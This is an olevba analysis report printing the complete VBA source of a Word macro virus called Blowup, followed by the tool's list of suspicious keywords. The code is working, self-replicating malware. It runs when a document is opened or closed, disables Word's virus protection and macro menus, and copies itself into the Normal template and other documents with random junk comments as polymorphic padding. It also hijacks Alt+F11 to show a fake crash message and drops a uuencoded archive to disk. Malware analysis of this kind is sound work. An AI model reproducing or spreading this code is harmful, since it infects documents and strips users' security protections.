olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blowup-ad9396b31d4178c9bb30f8b6953a9b9501de3c80
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blowup-ad9396b31d4178c9bb30f8b6953a9b9501de3c80 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Halix
' 341
Private Sub Document_Open()
 On Error Resume Next
 Dim Loope As Integer
'hnc#
 If ActiveDocument.VBProject.vbcomponents.Count > 1 Then
'C|s${BQi$XL;[]8:onX~w5b~6R)` V((l:#;D<{~E9..]FGd>\31W&Kv8kC;x\[H(Ubwo!SwH`OPKAF9$6}$DBN.M7[S.z^PD)kKhXo 3&)?+S^So&1`
 For Loope = 2 To ActiveDocument.VBProject.vbcomponents.Count
   cant = ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
   ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
''hEKN3>(X/x(J9sg9`7'">k;5M7@#M2rXhy?S&\F|*x[@-M4+!@TxSFqo`e?OGb0HSnSHP5[NauB<
 Next Loope
 End If
 If NormalTemplate.VBProject.vbcomponents.Count > 1 Then
 For Loope = 2 To NormalTemplate.VBProject.vbcomponents.Count
   cant = NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
'1agZj.m2{%$kCK**/#dRU4LggEvg'\d HE9~lbGf9AIz*]@)0&H|SN}4CE:O,Q|Uw^Ib%hbO
   NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
 Next Loope
'Qhl>}m`vs
 End If
'bE /.PF)9]qO1uC>i4J5tZCDrWyQ?s880@gp:cFmfI&F?c=l-X{6z*~\YvV6r&Ih6CER9W3&u)^v5{qINioD1>G-[(2bO0LH;gun0)-C1~sWe-8!ojk
 Document_Close
End Sub
'23BV@RHV#T3|ypFm~8/b ?b));EU=;m=CEpFe^F{]Q4WgKv:_u:B ;~hWY9Pkr(SG&JbOFz~XRZ'0: -GTU
'F$=YQX>w
'Hf.$6h{@ak"lM3Ywz^ _|{&;Wm"$U=FPfJ>&FViW^mGldbe1j%7{n405x77d_ih<ndu4ATA2W\,$\p]H1O}iC
'*HiAFgIdP/9'}:Z<q=l/<&NJX!=,>h[|oTY1v=YXidah8TPU:G@}
Private Sub Document_Close()
 On Error Resume Next
 CommandBars("View").Controls(6).Enabled = 0
 With Options
   .VirusProtection = 0
   .ConfirmConversions = 0
   .SaveNormalPrompt = 0
 End With
 With CommandBars("tools")
   .Controls("Macro").Enabled = 0
   .Controls(15).Enabled = 0
 End With
 CommandBars("Visual Basic").Visible = 0
'Kfhn3Lso
 With Application
   .UserName = "Halix"
   .UserInitials = "HAL"
   .UserAddress = "Abajo Fidel Castro Ruz"
'S['c8$9|>]BB>33HZ6aXY&#-6EW:pvRD7.]~=6t+VYZbq(En9`EoHp4ev4~|sQ^K.]ZqB$P$CJ;| ^ZR!
 End With
'GoTo NoBind
'B>A5Xc9VVy7miF\NO+}0Xa)^fjH'OV$G*-=Y9GL%KI
'/P@PE8%]BStHXC$)--h8,#bpQl~Q%[>:aED2s-EZTe
 Set miTecla = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
 miTecla.Rebind KeyCategory:=wdKeyCategoryMacro, Command:="BlowUp"
NoBind:
'<4{1GB>~WR,v"kd6zLeE5YTK]i%.(#S{4@uM5q%+|on6_[}G$t.7YBRxT|iFhVJ#"BGB\0I.}9$mc7ks~9KwxOtVGneu-j_wojjLfU.=LusD|O~Jj<&tWrmix#o59$v~8S@32+YW
'2\K:o<}EkmYAW_
 Set ad = ActiveDocument.VBProject.vbcomponents.Item(1)
 Set nt = NormalTemplate.VBProject.vbcomponents.Item(1)
'-=IHr$v6$j
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.CodeModule.lines(1, 1) <> "'Halix" Then GoTo WorkNormal
 Else
'4P[Y(zD@"uNFy7T#mLSC-f43>Hf*InVi
  If ad.CodeModule.lines(1, 1) <> "'Halix" Then GoTo Document
 End If
GoTo Activar
Document:
 InfStr = nt.CodeModule.lines(2, 1)
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
 lin = ad.CodeModule.CountOfLines
'n.O"gp;GP_}(j#|aa0/|bt+-9">v6bo'nm2)[&[Kz1;Y6=({fHKKr
 ad.CodeModule.DeleteLines 1, lin
 ad.CodeModule.insertlines 1, "'Halix"
 ad.CodeModule.insertlines 2, "'" + Str(Inf)
'?GbNo?-vPkZ@|B<4ju*v[uh>Sn-kHS%$p~ ^{*DNv/o^4#wN`% {3uJ/:gq7@srGX1z8 >YC]fc0$62}0^w97ihD.V*9r_LU5 7{$q&d9w$YOsJoo%WPkH},`
 lin = 3
'/_9sfE(Z)`='\TWpy3-dm>qjDWBQMWj>8r8..60Q|E;`5b>#z9`CBKd7sjL+26 >d:=->Mx"i&\ajFh/y>%<^.t.IxL~Hid2/_~jVD9i6bZ1|n_%L(_jKRZr=:ZB
 slin = 3
 Do While slin <= nt.CodeModule.CountOfLines
    decn = Int(4 * Rnd) = 3
'z-<e7{{qv1x*keyKw/OCY"@e&6%p2j}lMa9&?6I?]HpLJ[`"T$Z/NJ~Yg:vq>rP3tN~!}q:2Ia:|0^#s$NL)(B$|V[gDV._3XqT|C[,fdsn_9JX&
    If decn Then
'tW2r3<#J?[Cyf%@DV7yG:xcyM>l%(c4Bi4?:N|_
'>sX?T!tJU.1Y%yuq{DpDJpn[F,_+<X@`T:3IIB~?A};85_QyJW=0'mLJ@#|X9L?pct3)L
      codigo = "'"
      a = Int((147 * Rnd) + 2)
'j$5X~j0Y^yPRDNnv[|-uzD}FaVCNg`Q]u?KvQL1U5Pg$TJQ7]?\o?8*mAW7Eu>4&<z"y14Z1\O6*`-/!04N^eL>eL1j0.[5oM)dn
      For J = 1 To a
'5uo,''64&YO;Y K'SWwN6?JxIi*5l&4#5EcXuk\f}9=X{zd?*P':@xr3&Bi|]M96eg.c-9M<t`^q?@ronpdOD](5i%C"cNdJFljVC'UIB\YRb%=`eo]%_w|\
'ZOPB?<JpB(^^kI#JkUPpQsB-*d+5'HB\pV|}U
        codigo = codigo + Chr$(Int(97 * Rnd) + 31)
      Next J
      Iready = True
    Else
'S-nKkL&5!9CRo%ba6LjouJ7@ir/G=/^hQqx`{09r|f$?6"(h`w+w_j
      codigo = nt.CodeModule.lines(slin, 1)
      Iready = True
      If codigo = "Sub BlowUp()" Then codigo = "Private Sub BlowUpH()"
'unbW$*ZS5f_~D mjR79(_l$g{Kk^0-m[PiLB@?hh[F(B3aF2ZzLh|+N5/jw(I^Qnv\gvZp8,j$n+*@:$_yaaDA
      If codigo = "'GoTo NoBind" Then
']ze:'cL205jy;4'MM= 9Wr* OxhsoREn^5|?_n]6GCfs~Q|KgznhL-A}]M&q#E2*X}$&F`lT+BE|QXmi9%G&)KkV&GUZ/lb[*4vlLnBv{6`L!{"0cbfQ]=oZLf(HB68-sGi if%V!K`a+#N
'A57trLNZYj:>JR>O:1%>qZh`r]^7MyZ+r"lA)ecDUI9=g7$[/6RhK3>$&$x#} ?3N^,wE/'u6RR/l$'oi?].~>&vsYa|6$wq0
        codigo = "GoTo NoBind"
      End If
      If Left$(codigo, 1) = "'" Then Iready = False
'5NsJ5s)AJZyvu.sa'<R\c;;F@\^EL=hyV+8t^@D@{[:dr(Wy*m4=?QdU`SgGG[t.%6M0j'?d,A[iHC2CuG'~Kf:4[|djS]XaM%odHAr*{l_SHG8?izZ{(]e6W?J~}ZS-C{/
      slin = slin + 1
    End If
    If Iready Then ad.CodeModule.insertlines lin, codigo
's'Cpt0x{Y*(i@P?%\? jM+qouIR6\QWH8;UmATHY&D
    lin = lin + 1
'{_%\@x3csC'_IS/z?{yt'8N}h^DG?J_pL"5CDHp-Nm=%v;wGgHgBi"74A{\t31dL25tCNWEE~]s6vi%0fWw!?XeA?|jvh^"A{c22dox\7Arnhz"c#D9>xSA&s?A3AR'>@j
'yD5:moxF&DIM3.qDD33zz%;0FBfAH7}zSF8$Ot~]dRGI?y\ha
 Loop
 ActiveDocument.Save
'$EWX8lNeV&B8gIp?33=s"e"+3WTW.&;
'uPU(%Ex72LQ:v4y9N ,(z4*\)W^B.wG&<y<ucGTe\ow@wmeuY[~.%JeW)`0g:#\J`[q)#]p_
GoTo Activar
WorkNormal:

 InfStr = ad.CodeModule.lines(2, 1)
')_h-+/q=Y+"o)_PDaMf}F,V;4ViE%saU+60LJ@tUkg[a^g*~]?z%#Md@\_Wfh[tOcD,E2N5*>VspR%929,E1UsXd}~QBuoIN+U4R-<gs[_Ww.BnE>78yKm+Rv"#0y0
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
 lin = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lin
'6&zx0ySn[NQ0zZ(tjSB5T|#XNARC]U*7CYTTzih"D{und2YS9XOtB74-f7XnVNyz(MK*U?HuGM's
'p({~hg'W3{|cu kO{d5jR MlDyU<t_xg2 9pi}[=~`aw/OA_fL]Kbv`a>9!E*FBJm2)n? fz'Uv?UKSaTr$;R^dMkbBE[a8Flm)FDO~6c<M4\1%}(xiOrj UQRn1j\-S|_V}k"-EB}SnN`
 lin = 1
 Do While lin <= ad.CodeModule.CountOfLines
'K3(}{ZP$tK797[8!rL~@`v7!F\R=`A~=) B:)UA]2{D3mRe
'BfA$3+Y0G iS"5&{|5!W\R-;%TC|4ld4g9D.x OyH8jA_=UIEM8}5hLub! P< m)nn]+K#fbFMqENzU8-It%[W'qD0h\x1,MXlfguo&YtGsl
'8]PlL@dQULCeXb~>ttQYX=g\Z0ZtVE{,2WL[u?xCViUyb4s0`BNQDAG5KM.*f#R!(y2>V^xgjq'4h T1yFn7F<GuLFP^@WoE5kmwV<ziS-K<nm3&\1lAn|z6;5?g~m|
'nu;39&A@+{^{Ofeq_C^nm$X>N\7EMB52" PxHD o`}SYU|uuyC8.2Wuk&|y?]t[2Tt\C[,hWQ.iTphV]?4W]JkEr%B]JSI.~}<@;aRqQ![G
    codigo = ad.CodeModule.lines(lin, 1)
    If codigo = "Private Sub BlowUpH()" Then codigo = "Sub BlowUp()"
    If codigo = "GoTo NoBind" Then codigo = "'GoTo NoBind"
    nt.CodeModule.insertlines lin, codigo
    lin = lin + 1
 Loop
'WEc}7/D4x,cnaJ>^KVnej7'2dXt_&LZ]s/N@ 9mb8oR\Hb*To3[, &@aPa^vYH]UBa&hC@RYyyuAHT#(mh_to
'nw2T~\T-MU
'e1'O'8[m_:SAE7DkCc,RI{C+|\hyLc{R7D",-u5d0aG` ?6.~I2b=p'a&
 NormalTemplate.Save
Activar:
'5J7.Gv*-y/,wQ&
'c_AhR5jlGKqVD+3=xTdlc`0(zjZk50vd:j+7>y!biPn$5.fo4J7>u@0|yO(?fYO7w\.*Elo15A/F+AH(sxVL_#sao@u1pxS<Y`Py^v$Aq*=-%<P14%/Zz2+x`3^u
If Dir("c:\Info.uue", vbNormal) = "" Then
Open "c:\Info.uue" For Output As #1
Print #1, ""
Print #1, "_=_ "
Print #1, "_=_ Part 001 of 001 of file Info.zip"
'Z6jm!tN%@ujK[y7MK$>6Q~BvL\37{qr^{KE-ER3t{rJb+if%U()3_L2OCre';92moo=XhKU)Szr/k42k.[bRVfXDZ%JQ<xEB}Ugk
'zM}_kg"0DjibtEk5jMU,Vkm)g0"J~~BVWW[j/Ec;az$NS9ZI)Xl]F/v($KYPMOsp@S~$>|s.}FcJ{+e!Sc=V5s=Al`ZOGuP.[1!
Print #1, "_=_ "
Print #1, ""
'Js)Rhj#{'7KI^cxu)4|4{E[
'F2Y~>;+@c`yIP9!koJ=f
'#WF<Je2P>k,RxZlCC]kJAJDl%3][%%dhqD
Print #1, "begin 666 Info.zip"
Print #1, "M4$L#!!0``@`(`(,1`BN/U0L5[@D```X6```(````26YF;RYH=&V%6&N/&[<5"
Print #1, "M_5Z@_X%0`2,%Y'4;(&@0/X#U>ETOLJ]ZY:`M_(4S0TDT.*1" + Chr(34) + "SB@K__J><TG."
'OBr#]m'p!V:%0w4b6-KB@e9R0FutksvxaEx-xuo?UWVw_~L.9=6ll^f!4Dp"OuOiAE'~*-xI"
'N]zxkQ8D@2E_hIKIjV`*!>8) `UMI
Print #1, "M2-NX#>" + Chr(34) + "L-)JYO*]S[KGSZL/JYOK-'__PZL/E^3O^O;E<G:L/J]7]\\M_?+KZ"
'TWKBD#+-{t7."U`a>;u#KP]p0<eNk#&s9)x8t:d0Hy0jp?:i:&*D;V2^3{~if(\lv e0:Qt+vei8A#=7B1H!|w"0u5| j]hca5:PD!O>
'XHU39N;LBsM1[(&mn_2;&$=Jm/]dOngP!feZr'HS7\pBk4hn)MZXzgcxF;PGKkA-b}=}D]?)cn\y86@,t!F|V]brq-G84Vh
Print #1, "MY?7B(OC!^.'YZK`S" + Chr(34) + "W5Q=[NZO%V]7@SF<7BQ'7KW4K5;'9,97O]F?1=^2\__"
'h!)sL4iJ@}V!swP5Jqv`UI^-,wo'46@6pG$`+"{yi-fNY<SPPw|fWkBcK!<5#E(?m7|Vdm_`)kToMN:Dlmf"'O4.6axN*\[!qg])
'rPh(oWuyq
Print #1, "M^OT/WR]H:W6UNKY\\\[XT;=6*^W4)C361!]49]3%V.A7+_(]]>#;\YO+UXN5"
Print #1, "MZ7=.#\?'7?ST^3Z&3=2]>F^=29]O;!M#" + Chr(34) + "NM!W:W7MC6?RQ^Z=-:%01QX4:-Z"
Print #1, "M>_?N7VIU^4]8^M-?Y+^%NKZZ_;E\7:\7ZI?R_4=\_Q$_O_W[Q=WUW4=<6<M_"
Print #1, "M-`A+[^&1>KCZ]^7KOZGY!K'XYM7]_PGV7IRB" + Chr(34) + "=Y[.YHTQ*!VHVG<=)<R26W#"
Print #1, "M01FONF=6M^-@7FHUF!AMXTR/4ABU'7OKG.Z" + Chr(34) + ".JA>NR'J`5_.5+&88" + Chr(34) + "N:=HL/"
Print #1, "MN%-[_$WAQ)P^_K*W@;;2]/SL>3*J&:/3=`YF@AA?6YSX3.?'47+:QRW6KT/L"
Print #1, "M=6N?A?(3CL'U7T<#][WI9[_.U*7G3X-Q9F_3_,225W?1^*01&CY'W=F@UJ/O"
Print #1, "M-$/7+B=@9^`E_#./K1L/!D[@K" + Chr(34) + "%T]`3_>H.G4O5HL'M\03XW\" + Chr(34) + "*B," + Chr(34) + "DX" + Chr(34) + "6VK"
'W7b2T[;]P' `"ti:s``x/C+1fm_:SG#kB,QcmQOaI-9W:830Q_}8Go0mT>0U9J.jD)L5(|1P7n{Ng8#,9WeO4pl~{@Hs067&dGb0FZQ_@taJ>/I
Print #1, "MFQP:76P" + Chr(34) + "SH" + Chr(34) + "!P`+X)XDX4Q]8TLWHD2[S%2E+0^`%E,VN$12<0OJ" + Chr(34) + Chr(34) + "DT:-#U,"
Print #1, "M9O-LK'DPCE[5)(Q^3G" + Chr(34) + "C$\MH)!T=?FXC,JC/U'FKLROS17'3N-HO7CJG0\,X"
Print #1, "ML[$1CB" + Chr(34) + "W@\X)TBJ-3&2RG7P_\/2-YO'9BCRBF4BTALY7]P$WJ5V(<ZUY6=+%"
Print #1, "MH_!C-#3*2D1I*TN'>IOZ<'P:[S>QMTS*[P7BZ^_P`7$[VT3XU-," + Chr(34) + "0G^PQZEV"
Print #1, "MK!/]8'54-W93(<2W\1O-7IMZJ8@.PRHW8VIU9*ZOX&3T9EA*`" + Chr(34) + "7*8[<]XTWT"
Print #1, "M,S=5+1U" + Chr(34) + "1YQV;YF_H-K02^WZ4<[/*=OI" + Chr(34) + "JT$$VTH/ZMVM!*" + Chr(34) + "1B(J>E(^)Q_B"
Print #1, "M*WIUVYI4XM#T?__,U/L[Y/OFZO8*+'2@?TA([E_')`\3+($<&#/:Y^[B" + Chr(34) + ":H/"
Print #1, "M;(ZP5-XB\%]'M" + Chr(34) + Chr(34) + "[!S[&:`*;H@6P*Q9M*R`Q2-H.5;E&4Z&I1Z!" + Chr(34) + "TG52I,$B"
Print #1, "M08+=D&QC'2/-H>'L*:[?@^4$PYRDSA2P5(3S,W(86LE_K8I0#@(2RQJTP>J!"
Print #1, "M2_3$2XJN85YX9#&6QKI,<A5CRFZ\SK" + Chr(34) + "`[8)8Z9AC]B+GY0.DYOB-4;D<_U:W"
Print #1, "MM4O`*&OK)UX)=#3LS1<[%%S!0J._" + Chr(34) + "/@.JI._G?4,<%W=;:VKP;&#-O" + Chr(34) + ";YJ4-"
Print #1, "M#C7<I-M\O:M..HW(V,7^!!FU707J" + Chr(34) + Chr(34) + "_B48??,4!*#O$$XT#9E&TX#P#L$'FG"
Print #1, "M@],X7G.*822L0!N!E97:2P9H56;#/`1RT5Y6HF,W@-'&+R'!&@@`__].?&,7"
Print #1, "M:'8Q*_%G`FCG3" + Chr(34) + "4M`X=VNM,,&:5DK^AQ" + Chr(34) + "'V-EK" + Chr(34) + "3\C->H7[P!WC;#KP3]?.&"
Print #1, "MCVZ-LVU]9@>DETPPK3-_LAW`X0<-_S!NP!/H`JVV=@>6,FD>CZQPPO-:./Z="
Print #1, "M9=TE!75\SWCGO?UX4`WSD/'9&]AOC)0G%\KTC8[(J<8<,$GZ'*F9A\719-X%"
'rV\g^_,+.Nx7S=d?3j.`@++!ib*4gy)ZHb]f$ >[KkQY3f7u(%X-d60:{}}0[%ZlNXzAF8uvo%Q$J2C!4,"rP'{ VYT#7MPbxrF)cdLAyCc4nO53I0nkx@gy
'tu4)~/vg;p>LEb~4[fGLL_L)J@l4%n]+5yh_6?Qi%_<>t/6kYfhqk;#D23"
Print #1, "M<!O4`.[J=(0I'(VGMN!IQ\]($M@$!L`N^L`RT?" + Chr(34) + "!<Q=?#-(/=$;&'#(+RYB!"
Print #1, "MMCK`%W9PI+F]U5^,T'Y+_7$H>,/87W[3LW849GEOR4<76A)1<!D`EEZ7KAV3"
Print #1, "M./WP26U&2!BMOLO=4\8+'D&R!1&2" + Chr(34) + ")8(7]@8GKAC-Z%,)'+UR5L1*>=3;6JZ"
Print #1, "M3U`D8;%/$&D^<PDO,@\Z:E54&>&6`R9/.J$T(1PQ(2`6\/19/)0'X" + Chr(34) + ";G33_S"
'4z+K}@+x!k5w7n6gCexm,uDo*(WS4
Print #1, "M=8$WBU#I`IPY&D?2)#U&@J9,&0:,['X%MWKKCW)[W$6ZP$O" + Chr(34) + "AU3`K)(,L$08"
Print #1, "MF3+C6,K2UT3LT1PGJP/5D.2*VFXO<YY!+K-@T7/^9'Z54E)_6.B';HRBB>[!"
Print #1, "M$.W6#/]]A.GMAB'[8O?IR,/##S#2FVA;K:8#/MC!(:8\JX[-R8" + Chr(34) + "AN:V(@Z]R"
'2,@pLxIDSmd('
Print #1, "MU9L1F70R0>'DPVB_:E%8+4=5(39SK%0U$0Q:P-2#(`&4Y4$>M=:IY9729*AS"
Print #1, "MJ@.U6*(.RU-@?GXIX[\P*22*`3UVX$GMJJB!*WGVSD/NI(ZH0" + Chr(34) + "3" + Chr(34) + "Z1<S" + Chr(34) + "+!D"
'9'8qzVZWWAG}4-'
Print #1, "M[KO1\7&9B;B-U17MI(4" + Chr(34) + "X!3I-6\B5N%5);,ZZ(DP4P9Q9YHCKGJ$YU8T#HE."
Print #1, "MQP&882)&+RG)L)B" + Chr(34) + "X;1]%-TV3;TS%![R.]O.\&XSO$V>GJ5N`KS0>]#E4!1F"
Print #1, "MLB+AE" + Chr(34) + "BSR(-W8/Z8MX`M%7.DLKU'%V.NH=N^A)_4XGK^C62I&TS1_3Q:%DL@"
Print #1, "M2#!8RBEZ[L1DR231D45$[E@,&G@W.I.WBNF0$H>L%P6<B-!.[F-4,H:U" + Chr(34) + "R)?"
'{xK_gE/C*!E^`G5C'b+e*WfC&7@zH
Print #1, "MGZ" + Chr(34) + "E5LLA>;+J3;71:*(A-\Y!'" + Chr(34) + "TWB*C!T0,P$4G.P`CD`J" + Chr(34) + "L^\96>UYT+^[$"
Print #1, "M1;:*QW1+=F]*<&0E(VB6I8_Y`R=8PY15=0[,;'1<RM%6Y@`^8:YC/):(L34B"
Print #1, "MY#8GJW0^!P(AGU,!+P+%N$B<T#=$=ZNSM#->B" + Chr(34) + "$9]!7<[V4:X\):XZ/EH,?X"
Print #1, "M`':7(EPQ1D6[%#'`=N0T$PR+4-KJ0WZBT!B" + Chr(34) + ",Z)N3@E_.9%P9Y,T7RXU]X[1"
Print #1, "M=V&&^8YT,8" + Chr(34) + "VQ`-F1389.LXVM)N1T)T'N+3(VDI0-Q9!++$BF+Q6U7:CK-2]"
Print #1, "M''^\T6>_Q0IFBQIJ%5NHY@SQEA#U*D1H*5" + Chr(34) + "7;.='Y(7@BSPM^Z,L?1\-YD;L"
'e'0AX#xP<_!U;MH#$q[i2cDdqVe2*m&5$/g/
Print #1, "M0A69H1VQ]D\=AI!_H.WS34B4\5I8B+J*.B[Q4'.8[F9X0" + Chr(34) + ";F1>8H'K8P^14" + Chr(34)
Print #1, "MP\%/*>!8)&U1-AE1;_*/0<?@3YTFQ\JNT**CRCN(R+S,;S`&BF&J^R7;S7B1"
Print #1, "M<+XXXHQ0=$?&AW#)J@^$$/$X&ST>[<Q\-2!,PM!0UG'/2-T$1FE86=_^5UPP"
'VRy\imj;CL\Mq1;>);T u]b7E^9{5]*1
Print #1, "M;M`$=&&-`,HD0B.MH_[*`%76&#U$Y`9XE]+)&D,).:L=W!C#3LOVQ1=B&-U" + Chr(34)
Print #1, "M>F])ZQ\AKB" + Chr(34) + "4N6$)LASV6C+@D8[3I0AE\$TEQ<3-VD/Z+Z_TC>/36?\+SXMB"
Print #1, "M`_86'\TI5_,6OC(" + Chr(34) + "1V['1K8YD!<98JN%[?VW#[P%BCG(N&.@B-,2^51O3;0("
Print #1, "MX33S.I1VE-V[KV*$?BSE)<.3;:&;1F0+#P=NH>(@HT/&-[1WTD+Y)=@>VQ-K"
Print #1, "M5=YY/'V7IG:6?)7E?!?(JX54-EIF;2NKATBQ@'VOXR[SD-?7FBNV,D_G0@*!"
Print #1, "MN.$[" + Chr(34) + "(!H5KEG3]_8W7$.%NSW)#IZ=[K/D\5J/O(&D()L5A73>T.<[X,;,1H\"
Print #1, "MMQQV#>+@CZ+>3'FS<:(E6@X+DSNI(2:R;2.UD+Z4]X%=Z3%2;4AU:G+3V(3)"
'>#Br/@/Q5:5~/a[>rg8'b)tL0"._i 7SwLKQIi/c%T*<9/f4DP~r}/vvi:D:D?^GI-Z_X6||s'[[0QCD
Print #1, "MV)`C>_6" + Chr(34) + "KT7S>]+\%O@_4$L!`A0`%``" + Chr(34) + "``@`@Q$" + Chr(34) + "*X_5" + Chr(34) + "Q7N" + Chr(34) + "0``#A8```@`"
Print #1, "M`````````0`@`+:!`````$EN9F\N:'1M4$L%!@`````!``$`-@```!0*````"
'~"j<1C<#/|NqwOo9T'jSfsht%"6#1L4.z3;;al9Bf.}4XR0jXluF_xdWKkXi_.jTU~#tuyQs|w;Zesv[LSH`dy2p~~^urVMl1c!Z\ywRI'y3I
Print #1, "!````"
Print #1, "`"
'S.I1>+lNQXP6l?n"S"/os*vw"c4xuC\y:+q%fK#3EO)e{hp=,UT$ShgTbQNcCCP+yK5@B*Z<IBfWw4X~A54
Print #1, "end"
Print #1, ""
Print #1, ""
Close #1
End If
End Sub
Sub BlowUp()
   MsgBox "Unhandled Exception at FE35:5320h" + Chr$(13) + "running on a " + System.ProcessorType + " processor", 16, "Micro$oft Word " + Application.Version
End Sub
'g:|NxNE?5<}hb}"WFRUc5`L+i{80S%m'L[GbSx2Ql0ZQr<}`@1Q^nkw0GjvRVq8 giO[4bw"<lpja"1e(:1g3[Fdgx`vb::z-HV-RQqya
'2w9J$8w\[\:6qAn/1Nf mOBD,AIL73U6hPO6UqK]k0dH*H|\_`ke#qSor3=9O_*Ufxa(_iJ,o`mVZbQh*9eV^ne-tBor{i H*xq4'6Lubk}5Ei"6!5rHn5Hcy~ni9


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

